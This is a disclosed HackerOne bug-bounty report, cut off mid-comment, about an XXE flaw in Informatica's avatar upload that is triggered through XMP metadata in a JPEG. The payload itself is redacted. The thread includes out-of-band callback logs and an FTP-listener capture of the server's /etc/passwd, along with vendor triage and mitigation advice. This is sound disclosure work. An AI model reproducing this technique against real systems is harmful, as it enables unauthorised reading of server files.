{"id":836877,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzY4Nzc=","url":"https://hackerone.com/reports/836877","title":"XXE through injection of a payload in the XMP metadata of a JPEG file","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-04-02T05:09:42.965Z","submitted_at":"2020-04-02T05:09:42.965Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"moebius","url":"/moebius","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":453,"url":"https://hackerone.com/informatica","handle":"informatica","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Informatica","twitter_handle":"informatica","website":"https://www.informatica.com/","about":"Informatica Corporation is the world’s number one independent provider of data integration software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":true,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-04-21T09:29:34.893Z","bug_reporter_agreed_on_going_public_at":"2020-04-14T22:33:42.585Z","team_member_agreed_on_going_public_at":"2020-04-21T09:29:34.804Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Users are able to change their avatar picture. The avatar picture upload functionality is prone to a XXE attack when parsing the image file. Specifically, the XXE attack is executed through the injection of a payload in the \"XMP metadata\" of the uploaded JPEG file.\n\nProof of concept (note the \"Burp Collaborator Payload pointing to an External DTD\"):\n```\nPOST /edit-profile-avatar!uploadImage.jspa HTTP/1.1\nHost: ███████informatica.com\n\n  [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]\n```\n\nAnd I received the following calls (note the User-Agent \"Java██████\" confirming the vulnerability):\n\n```\nInteraction 0 \nType: HTTP \nClient IP: ███████ \nTimestamp: 2020-Apr-02 01:44:27 UTC  \nProtocol: HTTP  \n\nRAW HTTP request: \n\nGET /x.dtd HTTP/1.1 \nCache-Control: no-cache \nPragma: no-cache \nUser-Agent: Java██████ \nHost: N.syuj65rfsb27o1u78jcinsinnet6ky8n.burpcollaborator.net \nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive\n```\n\nSimilar calls were received from another IP address: 146.112.138.73\n\nFurthermore, the affected host should not be allowed to start a new connection to the Internet.\n\n## Impact\n\nThis issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. I didn't try any reading, but JAVA (JSPA is a JAVA Servlet File) is calling my external service, so the vulnerability is confirmed.","weakness":{"id":54,"name":"XML External Entities (XXE)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":769845,"file_name":"Screen_Shot_2020-04-02_at_2.04.53_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qiRepvWB73guarDWbBBwWvht?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-04-02_at_2.04.53_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-04-02_at_2.04.53_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153316Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=575d16d5e1f8291279ae4dd38ab6a94509bc0975de465c7fa08a4f6d9aa396ad","file_size":82931,"type":"image/png"},{"id":769846,"file_name":"Screen_Shot_2020-04-02_at_2.05.10_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zEBjnN2xvdkj1iNi1NeNeVVz?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-04-02_at_2.05.10_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-04-02_at_2.05.10_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153316Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f1e5b0bcd65dabca2e88b551a440d1210025029fbbc25f359b9ffb5b138c1952","file_size":37671,"type":"image/png"},{"id":769847,"file_name":"Screen_Shot_2020-04-02_at_2.05.44_AM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iWJy8aA2T86Q3CvvrrG3MNNY?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-04-02_at_2.05.44_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-04-02_at_2.05.44_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153316Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c146b7a9ee8429ba2abf67f01e52b66e5f61806b3c019dbc9483e57b94e13567","file_size":16718,"type":"image/png"}],"allow_singular_disclosure_at":"2020-05-14T22:33:42.628Z","allow_singular_disclosure_after":-44470774.29501552,"singular_disclosure_allowed":true,"vote_count":128,"voters":["totz_sec","agrippathemagus","checkm50","hackerontwowheels","a_d_a_m","mashoud1122","mirhat","bogdantcaciuc","shadowrunner","mik317","and 118 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7514379,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @moebius Thank you for your interest in Informatica's Responsible Disclosure program.  \nWe tried to re-produce this and was unable to do so.  While we are still investigating, could you please help us with a detailed POC? A video POC will be of a great help, including the poll result of the  burp collaborator. ","automated_response":false,"created_at":"2020-04-02T08:02:14.077Z","updated_at":"2020-04-02T08:02:14.077Z","actor":{"username":"aks_infa","cleared":false,"url":"/aks_infa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7515454,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @aks_infa ! I'm also still trying to create a custom PoC for you. I found this bug using the \"Upload Scanner\" extension, you can find it within the \"Extender\" option. See the screenshot for the configuration I used. The tool created the payload for the XMP data with a Collaborator ID I'm no longer able to re-use. I tried \"https://github.com/BuffaloWill/oxml_xxe\" to forge a file myself to a new Collaborator ID but I'm not getting the callback. \n\nIt's late here now, but later I will try with EXIFTool (check the headers of the modified picture by UploadScanner, it is using that tool to forge the original image).\n\nI'm 100% sure the vulnerability exists because I got calls from your IP addresses and the user agent is JAVA. Try to follow my reproduction steps and maybe you get the call too (see the new screenshots I attached).\n\nIf you still can't reproduce and follow my steps, I will be in touch soon, I will try again later. These vulnerabilities are not easy to get them working properly but with just a remote probe as I got you can say it is vulnerable.\n\nThanks!","automated_response":false,"created_at":"2020-04-02T09:11:32.919Z","updated_at":"2020-04-02T09:11:32.919Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":770041,"filename":"Screen_Shot_2020-04-02_at_6.01.07_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/PXxqnY9GpuGb7N9QQFYLAtBQ?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-04-02_at_6.01.07_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-04-02_at_6.01.07_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153316Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=422244a88ad88e77ae17bf419f257936480bbef457c8d52c012a6dea69737aad"}],"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7522814,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @aks_infa !\nIt is interesting, now I'm not getting the callback from the affected server. Are you still investigating the issue? I'm now working on this to get a payload working. Let me know if you fix it or limit new outbound traffic from the server.\n\nThanks!","automated_response":false,"created_at":"2020-04-02T19:23:44.076Z","updated_at":"2020-04-02T19:23:44.076Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7522871,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok! Got it working again:\n\n████","automated_response":false,"created_at":"2020-04-02T19:29:54.414Z","updated_at":"2020-04-17T11:49:48.405Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7523172,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was able to reproduce it! Check the video I recorded for you. In order to get this working, as it is inside a JPEG file, you have to deal with the exact bytes, but as you will see, it is responding my requests.\n\nIn order to fix this, check the JAVA paragraph here: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\n\nIt is not a common bug, it is exploiting the XMP metadata inside an authorized JPEG file.\n\nHope now you can reproduce this and fix this. Please, let me know!\n\nThanks!","automated_response":false,"created_at":"2020-04-02T20:00:43.264Z","updated_at":"2020-04-02T20:00:43.264Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7523976,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@aks_infa Finally! I was able to retrieve the \"/etc/passwd\" file from the server.\n\nThis is the DTD file I used:\n\n{F771303}\n\nAnd this is the Payload sent inside the image:\n\n█████\n\nThis is the result:\n\n```\nXXE-FTP listening \nConnected by %s ('█████████', 32231)\nUSER anonymous\n\nPASS Java█████\n\nTYPE I\n\n/root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\navahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npolkitd:x:999:998:User for polkitd:/:/sbin/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\n█████████\nntp:x:38:38::/etc/ntp:/sbin/nologin\n██████████\n█████████\nmailnull:x:47:47::/var/spool/mqueue:/sbin/nologin\nsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologin\n██████\nsystemd-bus-proxy:x:500:221:systemd Bus Proxy:/:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\npuppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologin\nnrpe:x:499:220:NRPE user for the NRPE service:/var/run/nrpe:/sbin/nologin\n█████████\n██████████\n\nEPSV\n\nEPRT |1|█████████|65407|\n\nRETR nologin\n```\n\nThat was the only file I got from the server as a PoC.\n\nLet me know!","automated_response":false,"created_at":"2020-04-02T22:19:57.397Z","updated_at":"2020-04-21T09:32:50.868Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":771303,"filename":"Screen_Shot_2020-04-02_at_7.16.26_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/151wztCUugGsyBwMFAPEQ9rh?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-04-02_at_7.16.26_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-04-02_at_7.16.26_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153317Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6e205e53c1f02eefe0460a2a57184fb3488e33d6f9ab323bf4699ccf9192b905"}],"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7525522,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @moebius Thank you for the detailed POC. I am passing this to the concern team for further investigation and fix. We will revert back as soon as we have further information.","automated_response":false,"created_at":"2020-04-03T04:57:37.515Z","updated_at":"2020-04-03T04:57:37.515Z","actor":{"username":"aks_infa","cleared":false,"url":"/aks_infa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7531128,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@aks_infa Perfect, thank you! I will wait then. Let me know if you need any other advise or recommendation on this. Be good and safe.","automated_response":false,"created_at":"2020-04-03T15:13:42.130Z","updated_at":"2020-04-03T15:13:42.130Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7531464,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @moebius, Thank you for this report! As a temporary resolution we have disabled the upload feature while the team work on a fix for the root cause of the problem.  If you get some time could you verify if the exploit is still possible on your end? \n\nThanks!","automated_response":false,"created_at":"2020-04-03T15:43:14.131Z","updated_at":"2020-04-03T15:43:14.131Z","actor":{"username":"kmcgaley","cleared":false,"url":"/kmcgaley","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7531595,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @kmcgaley ! Yes, I checked and now I can't see the feature in the UI. However, it is still possible to call the vulnerable endpoint if you know the full path (that might be found in the JS files):\n\n███\n\nTry to see if you can disable the endpoint or change its name (security by obscurity but could work while you fix it).\n\nAlso, add a rule in your firewalls, to deny new connections coming from the inside. Thats also a way, because even though it is vulnerable, the attacker won't get the Out of Band answer.\n\nLet me know!","automated_response":false,"created_at":"2020-04-03T16:01:18.311Z","updated_at":"2020-04-17T11:49:00.673Z","actor":{"username":"moebius","cleared":false,"url":"/moebius","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/860/887b65272a8206f31beb7d5e76156bd461632aec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7576475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @kmcgaley ! Hope you are doing 